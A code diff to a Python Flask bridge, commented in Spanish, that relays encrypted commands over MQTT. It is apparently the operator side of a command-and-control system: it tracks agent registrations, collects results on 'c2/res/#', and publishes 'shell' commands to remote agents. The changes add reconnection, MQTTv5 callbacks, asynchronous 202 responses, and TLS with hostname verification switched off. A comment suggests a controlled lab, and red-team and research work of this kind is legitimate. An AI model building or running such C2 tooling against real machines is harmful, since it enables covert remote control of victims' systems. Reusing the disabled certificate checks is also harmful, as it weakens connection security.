@@ -17,6 +17,7 @@ Endpoints:
 import os
 import json
 import sys
+import time
 from collections import deque
 from pathlib import Path
 
@@ -67,20 +68,46 @@ results_buffer: deque = deque(maxlen=1000)
 registers_buffer: deque = deque(maxlen=1000)
 
 # ──────────────────────────────────────────────
-# MQTT client
+# MQTT client (V2 callback + MQTTv5)
 # ──────────────────────────────────────────────
 
 app = Flask(__name__)
 
+mqtt_connected = False  # tracking manual porque is_connected() no siempre es confiable
 
-def on_connect(client, userdata, flags, rc):
+
+def on_connect(client, userdata, flags, rc, properties=None):
+    """Callback cuando el cliente MQTT se conecta (o reconecta)."""
+    global mqtt_connected
     if rc == 0:
+        mqtt_connected = True
         print(f"[MQTT] Connected to {MQTT_HOST}:{MQTT_PORT}")
         client.subscribe("c2/agents/register", qos=1)
         client.subscribe("c2/res/#", qos=1)
         print("[MQTT] Subscribed to c2/agents/register, c2/res/#")
     else:
+        mqtt_connected = False
+        # rc > 0 significa error de conexión MQTT (no ACL — eso viene en on_publish)
         print(f"[MQTT] Connection failed (rc={rc})")
+
+
+def on_disconnect(client, userdata, reason_code, properties=None):
+    """Callback de desconexión. paho-mqtt reconecta automáticamente."""
+    global mqtt_connected
+    mqtt_connected = False
+    if reason_code != 0:
+        print(f"[MQTT] Unexpected disconnect (rc={reason_code}), reconnecting...")
+
+
+def on_publish(client, userdata, mid, reason_code, properties=None):
+    """Callback cuando el broker responde al PUBLISH (QoS 1: PUBACK).
+
+    reason_code < 128  → éxito (0=Success, 16=NoMatchingSubscribers)
+    reason_code >= 128 → error (135=NotAuthorized, etc.)
+    """
+    if reason_code >= 128:
+        print(f"[MQTT] PUBLISH denied by broker (mid={mid}, rc={reason_code})")
+        print(f"[MQTT]   Check ACL: does this client have permission for the topic?")
 
 
 def on_message(client, userdata, msg):
@@ -110,9 +137,24 @@ def on_message(client, userdata, msg):
         print(f"[!] Error processing {msg.topic}: {e}")
 
 
-mqtt_client = mqtt.Client(client_id=MQTT_CLIENT_ID)
+mqtt_client = mqtt.Client(
+    client_id=MQTT_CLIENT_ID,
+    callback_api_version=mqtt.CallbackAPIVersion.VERSION2,
+    protocol=mqtt.MQTTv5,
+)
+
+# TLS: el server cert tiene CN=c2-broker, conectamos a localhost
+# tls_insecure_set salta la verificación de hostname (seguro en entorno controlado)
 mqtt_client.tls_set(CA_CERT, certfile=CLIENT_CERT, keyfile=CLIENT_KEY)
+mqtt_client.tls_insecure_set(True)
+
+# Reconexión automática con backoff exponencial
+mqtt_client.reconnect_delay_set(min_delay=1, max_delay=30)
+
+# Callbacks V2
 mqtt_client.on_connect = on_connect
+mqtt_client.on_disconnect = on_disconnect
+mqtt_client.on_publish = on_publish
 mqtt_client.on_message = on_message
 
 # ──────────────────────────────────────────────
@@ -124,6 +166,9 @@ mqtt_client.on_message = on_message
 def send_command():
     """Cifra y publica un comando a un agente.
 
+    La publicación es asíncrona (QoS 1). El bridge acepta el mensaje
+    y lo encola. Si el broker lo rechaza (ACL), se loguea en on_publish.
+
     Body:
     {
         "agent_id": "AG001",
@@ -131,6 +176,8 @@ def send_command():
         "command_type": "shell",
         "task_id": "TASK001"
     }
+
+    Returns HTTP 202 si el mensaje se encoló correctamente.
     """
     data = request.get_json(silent=True)
     if not data:
@@ -156,13 +203,13 @@ def send_command():
     info = mqtt_client.publish(topic, encrypted, qos=1)
 
     if info.rc == mqtt.MQTT_ERR_SUCCESS:
-        print(f"[CMD] Published to {topic} (task: {data.get('task_id', '?')})")
+        print(f"[CMD] Queued for publish to {topic} (task: {data.get('task_id', '?')})")
         return jsonify({
-            "status": "published",
+            "status": "accepted",
             "topic": topic,
             "task_id": data.get("task_id"),
             "agent_id": agent_id,
-        })
+        }), 202  # 202 Accepted → la publicación es asíncrona
     else:
         return jsonify({"error": f"MQTT publish failed (rc={info.rc})"}), 500
 
@@ -206,12 +253,23 @@ def main():
     print(f"    PSK:  {PSK_FILE}")
     print(f"    Certs: {CA_CERT}, {CLIENT_CERT}")
 
-    try:
-        mqtt_client.connect(MQTT_HOST, MQTT_PORT)
-        mqtt_client.loop_start()
-    except Exception as e:
-        print(f"[!] MQTT connection failed: {e}")
+    # Intentar conexión inicial al broker
+    connected = False
+    for attempt in range(3):
+        try:
+            mqtt_client.connect(MQTT_HOST, MQTT_PORT)
+            mqtt_client.loop_start()
+            connected = True
+            print(f"[MQTT] Connection initiated (attempt {attempt + 1})")
+            break
+        except Exception as e:
+            print(f"[MQTT] Connection attempt {attempt + 1} failed: {e}")
+            if attempt < 2:
+                time.sleep(2)
+
+    if not connected:
         print("[!] Bridge will start but MQTT is unavailable")
+        print("[!] The bridge will retry automatically via reconnect_delay_set")
 
     app.run(host=BRIDGE_HOST, port=BRIDGE_PORT)
 
